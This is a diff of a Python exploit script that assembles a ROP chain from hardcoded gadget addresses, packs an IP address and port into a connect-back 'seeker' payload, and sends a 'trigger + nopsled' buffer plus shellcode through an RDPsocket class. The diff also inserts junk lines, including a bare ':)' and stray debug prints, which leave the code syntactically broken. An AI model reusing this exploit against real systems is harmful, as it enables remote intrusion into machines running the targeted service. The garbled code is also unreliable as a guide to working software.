@@ -23,15 +23,24 @@ evil = trigger + nopsled
         parsed += struct.pack(">I", 0x8fe2b3d4) #POP - RET
         parsed += struct.pack(">I", 0xffffffff) #value to store in ecx
         parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
-        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
-        parsed += seeker[0] #add the prelude
-        parsed += seeker[1] #add the packed IP address
-        parsed += seeker[2] #add the packed port
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
-        parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
+
+        print("konflikt tu")
+        :) #konflikt
+        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret # swap back
+        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx # copy parameter to placeholder
+
+        if(1):
+            print("2")
+        print("xd")
+        return str(read(shellcode)), parsed
+
+    def connect(self, address):
+        self.parsed_shell = self.parse(address, shellcode)
+        super(RDPsocket, self).connect(address)
+
+    def evil_sendall(self):
+        super(RDPsocket, self).sendall(evil + self.parsed_shell[0] + self.parsed_shell[1])
+
 
 # balls
 
